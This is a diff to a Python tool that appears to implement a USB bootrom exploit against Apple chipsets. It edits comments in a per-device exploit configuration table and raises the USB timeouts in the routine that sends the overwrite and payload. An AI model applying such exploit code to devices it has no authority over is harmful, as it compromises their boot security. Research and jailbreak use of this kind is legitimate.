@@ -474,19 +474,19 @@ def all_exploit_configs():
     # A8 Chipset (T7000) - Apple TV (4th gen), HomePod, iPad mini 4, iPhone 6, iPhone 6 Plus and iPod touch (6th gen)
     DeviceConfig('iBoot-1992.0.0.1.19',   0x7000, None,    t7000_overwrite,    5,    1), # Currently not working
     
-    # T8002 Apple Watch Series 1 and 2 
+    # T8002: Apple Watch Series 1 and 2 
     DeviceConfig('iBoot-2651.0.0.1.31',   0x8002, None,    t800x_overwrite,    5,    1), # T8002 (DFU loop)  NEW: 1.27 seconds
    
-    # A9 Chipset (S8003):
+    # A9 Chipset (S8003) - iPhone 6s, iPhone 6s Plus and iPhone SE
     DeviceConfig('iBoot-2651.0.0.3.3',    0x8004, None,    t800x_overwrite,    5,    1), # T8004 (buttons)   NEW: 1.06 seconds
     
-    # A10 Chipset - iPad (6th generation), iPad (7th gen), iPhone 7, iPhone 7 Plus and iPod touch (7th gen).
+    # A10 Chipset (T8010) - iPad (6th generation), iPad (7th gen), iPhone 7, iPhone 7 Plus and iPod touch (7th gen).
     DeviceConfig('iBoot-2696.0.0.1.33',   0x8010, None,    t8010_overwrite,    5,    1), # T8010 (buttons)   NEW: 0.68 seconds
 
-    # A10X Chipset - iPad Pro (10.5-inch), iPad Pro (12.9-inch) (2nd gen) and Apple TV 4K.
+    # A10X Chipset (T8011) - iPad Pro (10.5-inch), iPad Pro (12.9-inch) (2nd gen) and Apple TV 4K.
     DeviceConfig('iBoot-3135.0.0.2.3',    0x8011, None,    t8011_overwrite,    6,    1), # T8011 (buttons)   NEW: 0.87 seconds
 
-    # A11 Chipset - iPhone 8, iPhone 8 Plus and iPhone X.
+    # A11 Chipset (T8015) - iPhone 8, iPhone 8 Plus and iPhone X.
     DeviceConfig('iBoot-3332.0.0.1.23',   0x8015, None,    t8015_overwrite,    6,    1), # T8015 (DFU loop)  NEW: 0.66 seconds
   ]
 
@@ -561,9 +561,9 @@ def exploit():
   else:
     for i in range(config.leak):
       usb_req_leak(device)
-  libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 10)
+  libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 50)
   for i in range(0, len(payload), 0x800):
-    libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 10)
+    libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50)
   dfu.usb_reset(device)
   dfu.release_device(device)
 
